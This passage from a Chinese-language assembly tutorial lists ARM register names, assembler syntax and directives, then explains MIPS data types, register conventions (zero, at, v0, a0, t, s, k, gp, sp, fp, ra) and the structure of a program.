\u4fdd\u5b58\u5bc4\u5b58\u5668\uff1a %r4 - %r10 \u5806\u6808 ptr \u5bc4\u5b58\u5668\uff1a %sp \u5e27 ptr \u5bc4\u5b58\u5668\uff1a %fp \u94fe\u63a5\u5bc4\u5b58\u5668\uff1a %lr \u7a0b\u5e8f\u8ba1\u6570\u5668\uff1a %ip \u72b6\u6001\u5bc4\u5b58\u5668\uff1a $psw \u72b6\u6001\u6807\u5fd7\u5bc4\u5b58\u5668\uff1a xPSR xPSR_all xPSR_f xPSR_x xPSR_ctl xPSR_fs xPSR_fx xPSR_fc xPSR_cs xPSR_cf xPSR_cx 3.5.4 \u6c47\u7f16\u7a0b\u5e8f\u7279\u6b8a\u5b57\u7b26/\u8bed\u6cd5 \u5185\u8054\u8bc4\u8bba\u5b57\u7b26\uff1a '@' \u884c\u8bc4\u8bba\u5b57\u7b26\uff1a '\uff03' \u8bed\u53e5\u5206\u9694\u7b26\uff1a ';' \u7acb\u5373\u64cd\u4f5c\u6570\u524d\u7f00\uff1a '\uff03' \u6216 '$' 3.5.5 arm\u7a0b\u5e8f\u8c03\u7528\u6807\u51c6 \u53c2\u6570\u5bc4\u5b58\u5668 \uff1a\uff05a0 - \uff05a4\uff08\u522b\u540d\u4e3a\uff05r0 - \uff05r4\uff09 \u8fd4\u56de\u503cregs \uff1a\uff05v1 - \uff05v6\uff08\u522b\u540d\u4e3a\uff05r4 - \uff05r9\uff09 3.5.6 \u5bfb\u5740\u6a21\u5f0f addr \u7edd\u5bf9\u5bfb\u5740\u6a21\u5f0f \uff05rn \u5bc4\u5b58\u5668\u76f4\u63a5\u5bfb\u5740 [\uff05rn] \u5bc4\u5b58\u5668\u95f4\u63a5\u5bfb\u5740\u6216\u7d22\u5f15 [\uff05rn\uff0c\uff03n] \u57fa\u4e8e\u5bc4\u5b58\u5668\u7684\u504f\u79fb\u91cf \u4e0a\u8ff0 \"rn\" \u6307\u4efb\u610f\u5bc4\u5b58\u5668\uff0c\u4f46\u4e0d\u5305\u62ec\u63a7\u5236\u5bc4\u5b58\u5668\u3002 3.5.7 \u673a\u5668\u76f8\u5173\u6307\u4ee4 \u6307\u4ee4 \u63cf\u8ff0 .arm \u4f7f\u7528arm\u6a21\u5f0f\u8fdb\u884c\u88c5\u914d .thumb \u4f7f\u7528thumb\u6a21\u5f0f\u8fdb\u884c\u88c5\u914d .code16 \u4f7f\u7528thumb\u6a21\u5f0f\u8fdb\u884c\u88c5\u914d .code32 \u4f7f\u7528arm\u6a21\u5f0f\u8fdb\u884c\u7ec4\u88c5 .force_thumb Force thumb\u6a21\u5f0f\uff08\u5373\u4f7f\u4e0d\u652f\u6301\uff09 .thumb_func \u5c06\u8f93\u5165\u70b9\u6807\u8bb0\u4e3athumb\u7f16\u7801\uff08\u5f3a\u5236bx\u6761\u76ee\uff09 .ltorg \u542f\u52a8\u4e00\u4e2a\u65b0\u7684\u6587\u5b57\u6c60 3.6 MIPS\u6c47\u7f16\u57fa\u7840 \u6570\u636e\u7c7b\u578b\u548c\u5e38\u91cf \u6570\u636e\u7c7b\u578b\uff1a \u6307\u4ee4\u5168\u662f32\u4f4d \u5b57\u8282\uff088\u4f4d\uff09\uff0c\u534a\u5b57\uff082\u5b57\u8282\uff09\uff0c\u5b57\uff084\u5b57\u8282\uff09 \u4e00\u4e2a\u5b57\u7b26\u9700\u89811\u4e2a\u5b57\u8282\u7684\u5b58\u50a8\u7a7a\u95f4 \u6574\u6570\u9700\u89811\u4e2a\u5b57\uff084\u4e2a\u5b57\u8282\uff09\u7684\u5b58\u50a8\u7a7a\u95f4 \u5e38\u91cf\uff1a \u6309\u539f\u6837\u8f93\u5165\u7684\u6570\u5b57\u3002\u4f8b\u5982 4 \u7528\u5355\u5f15\u53f7\u62ec\u8d77\u6765\u7684\u5b57\u7b26\u3002\u4f8b\u5982 'b' \u7528\u53cc\u5f15\u53f7\u62ec\u8d77\u6765\u7684\u5b57\u7b26\u4e32\u3002\u4f8b\u5982 \u201cA string\u201d \u5bc4\u5b58\u5668 32\u4e2a\u901a\u7528\u5bc4\u5b58\u5668 \u5bc4\u5b58\u5668\u524d\u9762\u6709 $ \u4e24\u79cd\u683c\u5f0f\u7528\u4e8e\u5bfb\u5740\uff1a \u4f7f\u7528\u5bc4\u5b58\u5668\u53f7\u7801\uff0c\u4f8b\u5982 $ 0 \u5230 $ 31 \u4f7f\u7528\u522b\u540d\uff0c\u4f8b\u5982 $ t1 \uff0c $ sp \u7279\u6b8a\u5bc4\u5b58\u5668 Lo \u548c Hi \u7528\u4e8e\u5b58\u50a8\u4e58\u6cd5\u548c\u9664\u6cd5\u7684\u7ed3\u679c \u4e0d\u80fd\u76f4\u63a5\u5bfb\u5740; \u4f7f\u7528\u7279\u6b8a\u6307\u4ee4 mfhi \uff08 \u201c \u4ece Hi \u79fb\u52a8 \u201d \uff09\u548c mflo \uff08 \u201c \u4ece Lo \u79fb\u52a8 \u201d \uff09\u8bbf\u95ee\u7684\u5185\u5bb9 \u6808\u4ece\u9ad8\u5230\u4f4e\u589e\u957f \u5bc4\u5b58\u5668 \u522b\u540d \u7528\u9014 $0 $zero \u5e38\u91cf0(constant value 0) $1 $at \u4fdd\u7559\u7ed9\u6c47\u7f16\u5668(Reserved for assembler) $2-$3 $v0-$v1 \u51fd\u6570\u8c03\u7528\u8fd4\u56de\u503c(values for results and expression evaluation) $4-$7 $a0-$a3 \u51fd\u6570\u8c03\u7528\u53c2\u6570(arguments) $8-$15 $t0-$t7 \u6682\u65f6\u7684(\u6216\u968f\u4fbf\u7528\u7684) $16-$23 $s0-$s7 \u4fdd\u5b58\u7684(\u6216\u5982\u679c\u7528\uff0c\u9700\u8981SAVE/RESTORE\u7684)(saved) $24-$25 $t8-$t9 \u6682\u65f6\u7684(\u6216\u968f\u4fbf\u7528\u7684) $26~$27 $k0~$k1 \u4fdd\u7559\u4f9b\u4e2d\u65ad/\u9677\u9631\u5904\u7406\u7a0b\u5e8f\u4f7f\u7528 $28 $gp \u5168\u5c40\u6307\u9488(Global Pointer) $29 $sp \u5806\u6808\u6307\u9488(Stack Pointer) $30 $fp \u5e27\u6307\u9488(Frame Pointer) $31 $ra \u8fd4\u56de\u5730\u5740(return address) \u518d\u6765\u8bf4\u4e00\u8bf4\u8fd9\u4e9b\u5bc4\u5b58\u5668 : zero \u5b83\u4e00\u822c\u4f5c\u4e3a\u6e90\u5bc4\u5b58\u5668\uff0c\u8bfb\u5b83\u6c38\u8fdc\u8fd4\u56de 0\uff0c\u4e5f\u53ef\u4ee5\u5c06\u5b83\u4f5c\u4e3a\u76ee\u7684\u5bc4\u5b58\u5668\u5199\u6570\u636e\uff0c\u4f46\u6548\u679c\u7b49\u4e8e\u767d\u5199\u3002\u4e3a\u4ec0\u4e48\u5355\u72ec\u62c9\u4e00\u4e2a\u5bc4\u5b58\u5668\u51fa\u6765\u8fd4\u56de\u4e00\u4e2a\u6570\u5b57\u5462\uff1f\u7b54\u6848\u662f\u4e3a\u4e86\u6548\u7387\uff0cMIPS \u7684\u8bbe\u8ba1\u8005\u53ea\u5141\u8bb8\u5728\u5bc4\u5b58\u5668\u5185\u6267\u884c\u7b97\u672f\u64cd\u4f5c\uff0c\u800c\u4e0d\u5141\u8bb8\u76f4\u63a5\u64cd\u4f5c\u7acb\u5373\u6570\u3002\u6240\u4ee5\u5bf9\u6700\u5e38\u7528\u7684\u6570\u5b57 0 \u5355\u72ec\u7559\u4e86\u4e00\u4e2a\u5bc4\u5b58\u5668\uff0c\u4ee5\u63d0\u9ad8\u6548\u7387 at \u8be5\u5bc4\u5b58\u5668\u4e3a\u7ed9\u7f16\u8bd1\u5668\u4fdd\u7559\uff0c\u7528\u4e8e\u5904\u7406\u5728\u52a0\u8f7d 16 \u4f4d\u4ee5\u4e0a\u7684\u5927\u5e38\u6570\u65f6\u4f7f\u7528\uff0c\u7f16\u8bd1\u5668\u6216\u6c47\u7f16\u7a0b\u5e8f\u9700\u8981\u628a\u5927\u5e38\u6570\u62c6\u5f00\uff0c\u7136\u540e\u91cd\u65b0\u7ec4\u5408\u5230\u5bc4\u5b58\u5668\u91cc\u3002\u7cfb\u7edf\u7a0b\u5e8f\u5458\u4e5f\u53ef\u4ee5\u663e\u5f0f\u7684\u4f7f\u7528\u8fd9\u4e2a\u5bc4\u5b58\u5668\uff0c\u6709\u4e00\u4e2a\u6c47\u7f16 directive \u53ef\u88ab\u7528\u6765\u7981\u6b62\u6c47\u7f16\u5668\u5728 directive \u4e4b\u540e\u518d\u4f7f\u7528 at \u5bc4\u5b58\u5668\u3002 v0, v1.\u8fd9\u4e24\u4e2a\u5f88\u7b80\u5355\uff0c\u7528\u505a\u51fd\u6570\u7684\u8fd4\u56de\u503c\uff0c\u5927\u90e8\u5206\u65f6\u5019\uff0c\u4f7f\u7528 v0 \u5c31\u591f\u4e86\u3002\u5982\u679c\u8fd4\u56de\u503c\u7684\u5927\u5c0f\u8d85\u8fc7 8 \u5b57\u8282\uff0c\u90a3\u5c31\u9700\u8981\u5206\u914d\u4f7f\u7528\u5806\u6808\uff0c\u8c03\u7528\u8005\u5728\u5806\u6808\u91cc\u5206\u914d\u4e00\u4e2a\u533f\u540d\u7684\u7ed3\u6784\uff0c\u8bbe\u7f6e\u4e00\u4e2a\u6307\u5411\u8be5\u53c2\u6570\u7684\u6307\u9488\uff0c\u8fd4\u56de\u65f6 v0 \u6307\u5411\u8fd9\u4e2a\u5bf9\u5e94\u7684\u7ed3\u6784\uff0c\u8fd9\u4e9b\u90fd\u662f\u7531\u7f16\u8bd1\u5668\u81ea\u52a8\u5b8c\u6210\u3002 a0-a3. \u7528\u6765\u4f20\u9012\u51fd\u6570\u5165\u53c2\u7ed9\u5b50\u51fd\u6570\u3002\u770b\u4e00\u4e0b\u8fd9\u4e2a\u4f8b\u5b50\uff1a ret = strncmp(\"bear\",\"bearer\",4) \u53c2\u6570\u5c11\u4e8e 16 \u5b57\u8282\uff0c\u53ef\u4ee5\u653e\u5165\u5bc4\u5b58\u5668\u4e2d\uff0c\u5728 strncmp \u7684\u51fd\u6570\u91cc\uff0ca0 \u5b58\u653e\u7684\u662f \"bear\" \u8fd9\u4e2a\u5b57\u7b26\u4e32\u6240\u5728\u7684\u53ea\u8bfb\u533a\u5730\u5740\uff0ca1 \u662f \"bearer\" \u7684\u5730\u5740\uff0ca2 \u662f 4. t0-t9 \u4e34\u65f6\u5bc4\u5b58\u5668 s0-s8 \u4fdd\u7559\u5bc4\u5b58\u5668 \u8fd9\u4e24\u79cd\u5bc4\u5b58\u5668\u9700\u8981\u653e\u5728\u4e00\u8d77\u8bf4\uff0c\u5b83\u4eec\u662f mips \u6c47\u7f16\u91cc\u9762\u4ee3\u7801\u91cc\u89c1\u5230\u7684\u6700\u591a\u7684\u4e24\u79cd\u5bc4\u5b58\u5668\uff0c\u5b83\u4eec\u7684\u4f5c\u7528\u90fd\u662f\u5b58\u53d6\u6570\u636e\uff0c\u505a\u8ba1\u7b97\u3001\u79fb\u4f4d\u3001\u6bd4\u8f83\u3001\u52a0\u8f7d\u3001\u5b58\u50a8\u7b49\u7b49\uff0c\u533a\u522b\u5728\u4e8e\uff0ct0-t9 \u5728\u5b50\u7a0b\u5e8f\u4e2d\u53ef\u4ee5\u4f7f\u7528\u5176\u4e2d\u7684\u503c\uff0c\u5e76\u4e0d\u5fc5\u5b58\u50a8\u5b83\u4eec\uff0c\u5b83\u4eec\u5f88\u9002\u5408\u7528\u6765\u5b58\u653e\u8ba1\u7b97\u8868\u8fbe\u5f0f\u65f6\u4f7f\u7528\u7684\u201c\u4e34\u65f6\u201d\u53d8\u91cf\u3002\u5982\u679c\u8fd9\u4e9b\u53d8\u91cf\u7684\u4f7f\u7528\u8981\u8981\u8df3\u8f6c\u5230\u5b50\u51fd\u6570\u4e4b\u524d\u5b8c\u6210\uff0c\u56e0\u4e3a\u5b50\u51fd\u6570\u91cc\u5f88\u53ef\u80fd\u4f1a\u4f7f\u7528\u76f8\u540c\u7684\u5bc4\u5b58\u5668\uff0c\u800c\u4e14\u4e0d\u4f1a\u6709\u4efb\u4f55\u4fdd\u62a4\u3002\u5982\u679c\u5b50\u7a0b\u5e8f\u91cc\u4e0d\u4f1a\u8c03\u7528\u5176\u5b83\u51fd\u6570\u90a3\u4e48\u5efa\u8bae\u5c3d\u91cf\u591a\u7684\u4f7f\u7528t0-t9\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u51fd\u6570\u5165\u53e3\u5904\u7684\u4fdd\u5b58\u548c\u7ed3\u675f\u65f6\u7684\u6062\u590d\u3002 \u76f8\u53cd\u7684\uff0cs0-s8 \u5728\u5b50\u7a0b\u5e8f\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u9700\u8981\u5c06\u5b83\u4eec\u5b58\u50a8\u5728\u5806\u6808\u91cc\uff0c\u5e76\u5728\u5b50\u7a0b\u5e8f\u7ed3\u675f\u524d\u6062\u590d\u3002\u4ece\u800c\u5728\u8c03\u7528\u51fd\u6570\u770b\u6765\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c\u6ca1\u6709\u53d8\u5316\u3002 k0, k1. \u8fd9\u4e24\u4e2a\u5bc4\u5b58\u5668\u662f\u4e13\u95e8\u9884\u7559\u7ed9\u5f02\u5e38\u5904\u7406\u6d41\u7a0b\u4e2d\u4f7f\u7528\u3002\u5f02\u5e38\u5904\u7406\u6d41\u7a0b\u4e2d\u6709\u4ec0\u4e48\u7279\u522b\u7684\u5730\u65b9\u5417\uff1f\u5f53\u7136\u3002\u5f53 MIPS CPU \u5728\u4efb\u52a1\u91cc\u8fd0\u884c\u7684\u65f6\u5019\uff0c\u4e00\u65e6\u6709\u5916\u90e8\u4e2d\u65ad\u6216\u8005\u5f02\u5e38\u53d1\u751f\uff0cCPU \u5c31\u4f1a\u7acb\u523b\u8df3\u8f6c\u5230\u4e00\u4e2a\u56fa\u5b9a\u5730\u5740\u7684\u5f02\u5e38 handler \u51fd\u6570\u6267\u884c\uff0c\u5e76\u540c\u65f6\u5c06\u5f02\u5e38\u7ed3\u675f\u540e\u8fd4\u56de\u5230\u4efb\u52a1\u7684\u6307\u4ee4\u5730\u5740\u8bb0\u5f55\u5728 EPC \u5bc4\u5b58\u5668\uff08Exception Program Counter\uff09\u91cc\u3002\u4e60\u60ef\u6027\u7684\uff0c\u5f02\u5e38 handler \u51fd\u6570\u5f00\u5934\u603b\u662f\u4f1a\u4fdd\u6301\u73b0\u573a\u5373 MIPS \u5bc4\u5b58\u5668\u5230\u4e2d\u65ad\u6808\u7a7a\u95f4\u91cc\uff0c\u800c\u5728\u5f02\u5e38\u8fd4\u56de\u524d\uff0c\u518d\u628a\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c\u6062\u590d\u56de\u53bb\u3002\u90a3\u5c31\u5b58\u5728\u4e00\u4e2a\u95ee\u9898\uff0c\u8fd9\u4e2a EPC \u91cc\u7684\u503c\u5b58\u653e\u5728\u54ea\u91cc\uff1f\u5f02\u5e38 handler \u51fd\u6570\u7684\u6700\u540e\u80af\u5b9a\u662f\u4e00\u53e5 jr x \uff0cX \u662f\u4e00\u4e2a MIPS \u5bc4\u5b58\u5668\uff0c\u5982\u679c\u5b58\u653e\u5728\u524d\u9762\u63d0\u5230\u7684 t0,s0 \u7b49\u7b49\uff0c\u90a3\u4e48 PC \u8df3\u56de\u4efb\u52a1\u6267\u884c\u73b0\u573a\u65f6\uff0c\u8fd9\u4e2a\u5bc4\u5b58\u5668\u91cc\u7684\u503c\u5c31\u4e0d\u518d\u662f\u5f02\u5e38\u53d1\u751f\u4e4b\u524d\u7684\u503c\u3002\u6240\u4ee5\u5fc5\u987b\u8981\u6709\u65f6\u5c31\u53ef\u4ee5\u4e00\u53e5 jr k0 \u6307\u4ee4\u8fd4\u56de\u4e86\u3002 k1 \u662f\u53e6\u5916\u4e00\u4e2a\u4e13\u4e3a\u5f02\u5e38\u800c\u751f\u7684\u5bc4\u5b58\u5668\uff0c\u5b83\u53ef\u4ee5\u7528\u6765\u8bb0\u5f55\u4e2d\u65ad\u5d4c\u5957\u7684\u6df1\u5ea6\u3002CPU \u5728\u6267\u884c\u4efb\u52a1\u7a7a\u95f4\u7684\u4ee3\u7801\u65f6\uff0ck1 \u5c31\u53ef\u4ee5\u7f6e\u4e3a 0\uff0c\u8fdb\u5165\u5230\u4e2d\u65ad\u7a7a\u95f4\uff0c\u6bcf\u8fdb\u5165\u4e00\u6b21\u5c31\u52a0 1\uff0c\u9000\u51fa\u4e00\u6b21\u76f8\u5e94\u51cf 1\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u8bb0\u5f55\u4e2d\u65ad\u5d4c\u5957\u7684\u6df1\u5ea6\u3002\u8fd9\u4e2a\u6df1\u5ea6\u5728\u8c03\u8bd5\u95ee\u9898\u7684\u65f6\u5019\u7ecf\u5e38\u4f1a\u7528\u5230\uff0c\u540c\u65f6\u5e94\u7528\u7a0b\u5e8f\u5728\u505a\u4e00\u6b21\u4e8b\u60c5\u7684\u65f6\u5019\u53ef\u80fd\u4f1a\u9700\u8981\u77e5\u9053\u5f53\u524d\u662f\u5728\u4efb\u52a1\u8fd8\u662f\u4e2d\u65ad\u4e0a\u4e0b\u6587\uff0c\u8fd9\u65f6\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 k1 \u5bc4\u5b58\u5668\u662f\u5426\u4e3a 0 \u6765\u5224\u65ad\u3002 sp \u6307\u5411\u5f53\u524d\u6b63\u5728\u64cd\u4f5c\u7684\u5806\u6808\u9876\u90e8\uff0c\u5b83\u6307\u5411\u5806\u6808\u4e2d\u7684\u4e0b\u4e00\u4e2a\u53ef\u5199\u5165\u7684\u5355\u5143\uff0c\u5982\u679c\u4ece\u6808\u9876\u83b7\u53d6\u4e00\u4e2a\u5b57\u8282\u662f sp-1 \u5730\u5740\u7684\u5185\u5bb9\u3002\u5728\u6709 RTOS \u7684\u7cfb\u7edf\u91cc\uff0c\u6bcf\u4e2a task \u90fd\u6709\u81ea\u5df1\u7684\u4e00\u4e2a\u5806\u6808\u7a7a\u95f4\u548c\u5b9e\u65f6 sp \u526f\u672c\uff0c\u4e2d\u65ad\u4e5f\u6709\u81ea\u5df1\u7684\u5806\u6808\u7a7a\u95f4\u548c sp \u526f\u672c\uff0c\u5b83\u4eec\u4f1a\u5728\u4e0a\u4e0b\u6587\u5207\u6362\u7684\u8fc7\u7a0b\u4e2d\u8fdb\u884c\u4fdd\u5b58\u548c\u6062\u590d\u3002 gp \u8fd9\u662f\u4e00\u4e2a\u8f85\u52a9\u578b\u7684\u5bc4\u5b58\u5668\uff0c\u5176\u542b\u4e49\u8f83\u4e3a\u6a21\u7cca\uff0cMIPS \u5b98\u65b9\u4e3a\u8be5\u5bc4\u5b58\u5668\u63d0\u4f9b\u4e86\u4e24\u4e2a\u7528\u6cd5\u5efa\u8bae\uff0c\u4e00\u79cd\u662f\u6307\u5411 Linux \u5e94\u7528\u4e2d\u4f4d\u7f6e\u65e0\u5173\u4ee3\u7801\u4e4b\u5916\u7684\u6570\u636e\u5f15\u7528\u7684\u5168\u5c40\u504f\u79fb\u91cf\u8868\uff1b \u5728\u8fd0\u884c RTOS \u7684\u5c0f\u578b\u5d4c\u5165\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u5b83\u53ef\u4ee5\u6307\u5411\u4e00\u5757\u8bbf\u95ee\u8f83\u4e3a\u9891\u7e41\u7684\u5168\u5c40\u6570\u636e\u533a\u57df\uff0c\u7531\u4e8eMIPS \u6c47\u7f16\u6307\u4ee4\u957f\u5ea6\u90fd\u662f 32bit\uff0c\u6307\u4ee4\u5185\u90e8\u7684 offset \u4e3a 16bit\uff0c\u4e14\u4e3a\u6709\u7b26\u53f7\u6570\uff0c\u6240\u4ee5\u80fd\u7528\u4e00\u6761\u6307\u4ee4\u4ee5 gp \u4e3a\u57fa\u5730\u5740\u8bbf\u95ee\u6b63\u8d1f 15bit \u7684\u5730\u5740\u7a7a\u95f4\uff0c\u63d0\u9ad8\u6548\u7387\u3002\u90a3\u4e48\u7f16\u8bd1\u5668\u600e\u4e48\u77e5\u9053gp\u521d\u59cb\u5316\u7684\u503c\u5462\uff1f\u53ea\u8981\u5728 link \u6587\u4ef6\u4e2d\u6dfb\u52a0 _gp \u7b26\u53f7\uff0c\u8fde\u63a5\u5668\u5c31\u4f1a\u8ba4\u4e3a\u8fd9\u662f gp \u7684\u503c\u3002\u6211\u4eec\u5728\u4e0a\u7535\u65f6\uff0c\u5c06 _gp \u7684\u503c\u8d4b\u7ed9 gp \u5bc4\u5b58\u5668\u5c31\u884c\u4e86\u3002 \u8bdd\u8bf4\u56de\u6765\uff0c\u8fd9\u90fd\u662f MIPS \u8bbe\u8ba1\u8005\u7684\u5efa\u8bae\uff0c\u4e0d\u662f\u5f3a\u5236\uff0c\u697c\u4e3b\u8fd8\u89c1\u8fc7\u4e00\u79cd gp \u5bc4\u5b58\u5668\u7684\u7528\u6cd5\uff0c\u6765\u5728\u4e2d\u65ad\u548c\u4efb\u52a1\u5207\u6362\u65f6\u505a sp \u7684\u5b58\u50a8\u8fc7\u6e21\uff0c\u4e5f\u662f\u53ef\u4ee5\u7684\u3002 fp \u8fd9\u4e2a\u5bc4\u5b58\u5668\u4e0d\u540c\u7684\u7f16\u8bd1\u5668\u5bf9\u5176\u89e3\u91ca\u4e0d\u540c\uff0cGNU MIPS C \u7f16\u8bd1\u5668\u4f7f\u7528\u5176\u4f5c\u4e3a\u5e27\u6307\u9488\uff0c\u6307\u5411\u5806\u6808\u91cc\u7684\u8fc7\u7a0b\u5e27\uff08\u4e00\u4e2a\u5b50\u51fd\u6570\uff09\u7684\u7b2c\u4e00\u4e2a\u5b57\uff0c\u5b50\u51fd\u6570\u53ef\u4ee5\u7528\u5176\u505a\u4e00\u4e2a\u504f\u79fb\u8bbf\u95ee\u6808\u5e27\u91cc\u7684\u5c40\u90e8\u53d8\u91cf\uff0csp \u4e5f\u53ef\u4ee5\u8f83\u4e3a\u7075\u6d3b\u7684\u79fb\u52a8\uff0c\u56e0\u4e3a\u5728\u51fd\u6570\u9000\u51fa\u4e4b\u524d\u4f7f\u7528 fp \u6765\u6062\u590d\uff1b\u8fd8\u8981\u4e00\u79cd\u800c SGI \u7684 C \u7f16\u8bd1\u5668\u4f1a\u5c06\u8fd9\u4e2a\u5bc4\u5b58\u5668\u76f4\u63a5\u4f5c\u4e3a s8,\u6269\u5c55\u4e86\u4e00\u4e2a\u4fdd\u7559\u5bc4\u5b58\u5668\u7ed9\u7f16\u8bd1\u5668\u4f7f\u7528\u3002 ra \u5728\u51fd\u6570\u8c03\u7528\u8fc7\u7a0b\u4e2d\uff0c\u4fdd\u6301\u5b50\u51fd\u6570\u8fd4\u56de\u540e\u7684\u6307\u4ee4\u5730\u5740\u3002\u6c47\u7f16\u8bed\u53e5\u91cc\u51fd\u6570\u8c03\u7528\u7684\u5f62\u5f0f\u4e3a\uff1a jal function_X \u8fd9\u6761\u6307\u4ee4 jal(jump-and-link,\u8df3\u8f6c\u5e76\u94fe\u63a5) \u6307\u4ee4\u4f1a\u5c06\u5f53\u671f\u6267\u884c\u8fd0\u884c\u6307\u4ee4\u7684\u5730\u5740 +4 \u5b58\u50a8\u5230 ra \u5bc4\u5b58\u5668\u91cc\uff0c\u7136\u540e\u8df3\u8f6c\u5230 function_X \u7684\u5730\u5740\u5904\u3002\u76f8\u5e94\u7684\uff0c\u5b50\u51fd\u6570\u8fd4\u56de\u65f6\uff0c\u6700\u5e38\u89c1\u7684\u4e00\u6761\u6307\u4ee4\u5c31\u662f jr ra ra \u662f\u4e00\u4e2a\u5bf9\u4e8e\u8c03\u8bd5\u5f88\u6709\u7528\u7684\u5bc4\u5b58\u5668\uff0c\u7cfb\u7edf\u7684\u8fd0\u884c\u7684\u4efb\u4f55\u65f6\u523b\u90fd\u53ef\u4ee5\u67e5\u770b\u5b83\u7684\u503c\u4ee5\u83b7\u53d6 CPU \u7684\u8fd0\u884c\u8f68\u8ff9\u3002 \u6700\u540e\uff0c\u5982\u679c\u7eaf\u5199\u6c47\u7f16\u8bed\u53e5\u7684\u8bdd\uff0c\u8fd9\u4e9b\u5bc4\u5b58\u5668\u5f53\u4e2d\u9664\u4e86 zero \u4e4b\u5916\uff0c\u5176\u5b83\u7684\u57fa\u672c\u4e0a\u90fd\u53ef\u4ee5\u505a\u666e\u901a\u5bc4\u5b58\u5668\u5b58\u53d6\u6570\u636e\u4f7f\u7528\uff08\u8fd9\u4e5f\u662f\u5b83\u4eec\u4e3a\u4ec0\u4e48\u4f1a\u5b9a\u4e49\u4e3a\u201c\u901a\u7528\u5bc4\u5b58\u5668\u201d\uff0c\u800c\u4e0d\u50cf\u5176\u5b83\u7684\u534f\u5904\u7406\u5668\u3001\u6216\u8005\u5916\u8bbe\u7684\u90fd\u662f\u4e13\u7528\u5bc4\u5b58\u5668\uff0c\u5176\u5728\u51fa\u5382\u65f6\u6240\u6709\u7684\u529f\u80fd\u90fd\u662f\u5b9a\u6b7b\u7684\uff09\uff0c\u90a3\u4e3a\u4ec0\u4e48\u6709\u8fd9\u4e48\u591a\u89c4\u5219\u5462 \uff1fMIPS \u5f00\u53d1\u8005\u4eec\u4e3a\u4e86\u8ba9\u81ea\u5df1\u7684\u5904\u7406\u5668\u53ef\u4ee5\u8fd0\u884c\u50cf C\u3001Java \u8fd9\u6837\u7684\u9ad8\u7ea7\u8bed\u8a00\uff0c\u4ee5\u53ca\u8ba9\u6c47\u7f16\u8bed\u8a00\u548c\u9ad8\u7ea7\u8bed\u8a00\u53ef\u4ee5\u5b89\u5168\u7684\u6df7\u5408\u7f16\u7a0b\u800c\u8bbe\u8ba1\u7684\u4e00\u5957 ABI\uff08\u5e94\u7528\u7f16\u7a0b\u63a5\u53e3\uff09\uff0c\u4e0d\u540c\u7684\u7f16\u8bd1\u5668\u7684\u8bbe\u8ba1\u8005\u4eec\u5c31\u4f1a\u6709\u636e\u53ef\u4f9d\uff0c\u7cfb\u7edf\u7a0b\u5e8f\u5458\u4eec\u5728\u9605\u8bfb\u3001\u4fee\u6539\u6c47\u7f16\u7a0b\u5e8f\u7684\u65f6\u5019\u4e5f\u80fd\u6839\u636e\u8fd9\u4e9b\u7ea6\u5b9a\u800c\u66f4\u4e3a\u987a\u7545\u5730\u7406\u89e3\u6c47\u7f16\u4ee3\u7801\u7684\u542b\u4e49\u3002 \u7a0b\u5e8f\u7ed3\u6784 \u672c\u8d28\u4e0a\u53ea\u662f\u5e26\u6709\u6570\u636e\u58f0\u660e\u7684\u7eaf\u6587\u672c\u6587\u4ef6\uff0c\u7a0b\u5e8f\u4ee3\u7801 ( \u6587\u4ef6\u540d\u5e94\u4ee5\u540e\u7f00 .s \u7ed3\u5c3e\uff0c\u6216\u8005.asm ) \u6570\u636e\u58f0\u660e\u90e8\u5206\u540e\u8ddf\u7a0b\u5e8f\u4ee3\u7801\u90e8\u5206 \u6570\u636e\u58f0\u660e \u6570\u636e\u4ee5 .data \u4e3a\u6807\u8bc6 \u58f0\u660e\u53d8\u91cf\u540e\uff0c\u5373\u5728\u5185\u5b58\u4e2d\u5206\u914d\u7a7a\u95f4 \u4ee3\u7801 \u653e\u5728\u7528\u6c47\u7f16\u6307\u4ee4 .text \u6807\u8bc6\u7684\u6587\u672c\u90e8\u5206\u4e2d \u5305\u542b\u7a0b\u5e8f\u4ee3\u7801\uff08 \u6307\u4ee4 \uff09 \u7ed9\u5b9a\u6807\u7b7e main \u4ee3\u7801\u6267\u884c\u7684\u8d77\u70b9 ( \u548c C \u8bed\u8a00\u4e00\u6837 ) \u7a0b\u5e8f\u7ed3\u675f\u6807\u5fd7\uff08\u89c1\u4e0b\u9762\u7684\u7cfb\u7edf\u8c03\u7528\uff09 \u6ce8\u91ca \uff03 \u8868\u793a\u5355\u884c\u6ce8\u91ca \uff03 \u540e\u9762\u7684\u4efb\u4f55\u5185\u5bb9\u90fd\u4f1a\u88ab\u89c6\u4e3a\u6ce8\u91ca MIPS \u6c47\u7f16\u8bed\u8a00\u7a0b\u5e8f\u7684\u6a21\u677f\uff1a \uff03\u7ed9\u51fa\u7a0b\u5e8f\u540d\u79f0\u548c\u529f\u80fd\u63cf\u8ff0\u7684\u6ce8\u91ca \uff03Template.s #MIPS\u6c47\u7f16\u8bed\u8a00\u7a0b\u5e8f\u7684Bare-bones\u6982\u8ff0 .data #\u53d8\u91cf\u58f0\u660e\u9075\u5faa\u8fd9\u4e00\u884c \uff03... .text\uff03\u6307\u4ee4\u8ddf\u968f\u8fd9\u4e00\u884c main\uff1a\uff03\u8868\u793a\u4ee3\u7801\u7684\u5f00\u59cb\uff08\u6267\u884c\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\uff09 \uff03... \uff03\u7a0b\u5e8f\u7ed3\u675f\uff0c\u4e4b\u540e\u7559\u7a7a\uff0c\u8ba9SPIM\u6ee1\u610f. \u53d8\u91cf\u58f0\u660e \u58f0\u660e\u683c\u5f0f\uff1a name\uff1astorage_type value\uff08s\uff09 \u4f7f\u7528\u7ed9\u5b9a\u540d\u79f0\u548c\u6307\u5b9a\u503c\u4e3a\u6307\u5b9a\u7c7b\u578b\u7684\u53d8\u91cf\u521b\u5efa\u7a7a\u95f4 value (s) \u901a\u5e38\u7ed9\u51fa\u521d\u59cb\u503c; \u5bf9\u4e8e.space\uff0c\u7ed9\u51fa\u8981\u5206\u914d\u7684\u7a7a\u683c\u6570 \u6ce8\u610f\uff1a\u6807\u7b7e\u540e\u9762\u8ddf\u5192\u53f7\uff08:) \u4f8b\u5982 var1\uff1a.word 3 